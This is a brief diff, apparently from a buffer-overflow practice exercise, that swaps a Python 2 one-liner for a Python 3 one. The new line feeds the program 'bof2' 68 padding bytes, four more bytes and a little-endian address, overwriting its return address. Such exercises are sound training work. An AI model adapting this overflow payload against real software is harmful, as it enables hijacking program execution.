@@ -1,2 +1,3 @@
-./bof2 $(python -c 'print "a"*68 + "bbbb" +"\x9b\x84\x04\x08"')
+# ./bof2 $(python -c 'print "a"*68 + "bbbb" +"\x9b\x84\x04\x08"')
+./bof2 $(python3 -c 'import sys; sys.stdout.buffer.write(b"a"*68 + b"bbbb" +b"\x9b\x84\x04\x08")')
 
